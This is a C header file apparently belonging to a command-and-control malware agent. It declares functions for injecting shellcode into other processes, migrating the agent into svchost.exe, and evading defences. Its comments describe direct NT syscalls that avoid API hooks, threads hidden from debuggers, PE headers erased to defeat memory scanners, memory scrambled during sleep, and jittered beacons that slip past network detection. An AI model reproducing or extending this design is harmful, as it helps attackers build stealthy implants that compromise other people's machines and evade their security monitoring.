/*
 * client/inject.h  –  Process injection and agent migration
 * ==========================================================
 * Exposes two verbs that the shell dispatch loop can call:
 *
 *   inject <pid> <hex-shellcode>
 *   -----------------------------------------------------------------------
 *   Allocates RW memory in the target process, writes the raw shellcode
 *   bytes (received as a hex string), marks it RX, then creates a remote
 *   thread to execute it.
 *
 *   Uses direct NT syscalls (NtAllocateVirtualMemory, NtWriteVirtualMemory,
 *   NtProtectVirtualMemory, NtCreateThreadEx) resolved at runtime from
 *   ntdll.dll to avoid high-entropy IAT entries for VirtualAllocEx /
 *   CreateRemoteThread — the two most-scanned Windows API calls.
 *
 *   migrate <pid>
 *   -----------------------------------------------------------------------
 *   Reads this process's EXE image from disk, injects it into <pid> as a
 *   reflective PE loader, signals success back to the C2, then calls
 *   ExitProcess(0) to clean up the current agent process.
 *
 *   The reflective PE loader is a minimal position-independent stub
 *   (< 512 bytes) emitted inline — no external DLL dependency.
 *
 * Evasion techniques used
 * -----------------------
 *   • NT native API instead of Win32 wrappers (skips kernel32 hooks)
 *   • Two-phase memory permission: RW → RX (no RWX pages ever touched)
 *   • OpenProcess with PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
 *     PROCESS_CREATE_THREAD only — minimal handle privileges
 *   • NtCreateThreadEx with HideFromDebugger flag
 *   • No LoadLibrary / GetProcAddress in injected code path
 */

#pragma once
#ifndef CLIENT_INJECT_H
#define CLIENT_INJECT_H

#ifndef WIN32_LEAN_AND_MEAN
#define CLIENT_INJECT_H_INCLUDED_LEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>
#include "../../tls/tls_client.h"

#ifdef __cplusplus
extern "C" {
#endif

/*
 * inject_init
 * -----------
 * Resolves all NT function pointers needed by inject_shellcode() and
 * migrate_to_pid().  Must be called once at startup (before any inject
 * or migrate command can be processed).
 *
 * Returns TRUE if every required symbol resolved, FALSE otherwise.
 * A FALSE return means inject/migrate commands will be rejected with an
 * error message rather than crashing.
 */
BOOL inject_init(void);

/*
 * inject_shellcode
 * ----------------
 * Parses <args> as "<pid> <hex-bytes>" where hex-bytes is an even-length
 * ASCII hex string representing the raw shellcode (e.g. produced by
 * msfvenom -f hex).  Injects and executes the shellcode inside <pid>.
 *
 * Sends a status string back to the C2 via pTls.
 */
void inject_shellcode(TLS_CONTEXT *pTls, const char *args);

/*
 * migrate_to_pid
 * --------------
 * Migrates this agent into <pid> by injecting a copy of the agent EXE
 * as a reflective PE and exiting the current process.
 *
 * Sends a final status message before exiting.
 */
void migrate_to_pid(TLS_CONTEXT *pTls, const char *args);

/*
 * auto_migrate
 * ------------
 * Called once at startup (before the C2 connect loop).
 * Finds a suitable svchost.exe, injects a copy of this agent into it,
 * erases the PE headers in the target to defeat memory scanners, then
 * calls ExitProcess(0) so the original process disappears from Task Manager.
 *
 * Returns FALSE only if no suitable target was found or injection failed —
 * in that case the agent continues running in the original process.
 * On success this function never returns (ExitProcess is called).
 */
BOOL auto_migrate(const char *keyPath);

/*
 * obfuscate_sleep
 * ---------------
 * Sleeps for <ms> milliseconds while XOR-scrambling all private RX pages in
 * this process so memory scanners see only ciphertext during the idle period.
 * Falls back to plain Sleep() if BCryptGenRandom fails.
 */
void obfuscate_sleep(DWORD ms);

/*
 * jitter_sleep
 * ------------
 * Calls obfuscate_sleep() for a duration drawn uniformly from:
 *   [base_ms * (1 - RECONNECT_JITTER_PCT/100),
 *    base_ms * (1 + RECONNECT_JITTER_PCT/100)]
 *
 * This breaks fixed-interval beacon detection in network flow analysis.
 * Uses BCryptGenRandom for the random offset so no CRT rand() dependency.
 * Falls back to plain obfuscate_sleep(base_ms) if BCrypt fails.
 */
void jitter_sleep(DWORD base_ms);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_INJECT_H */
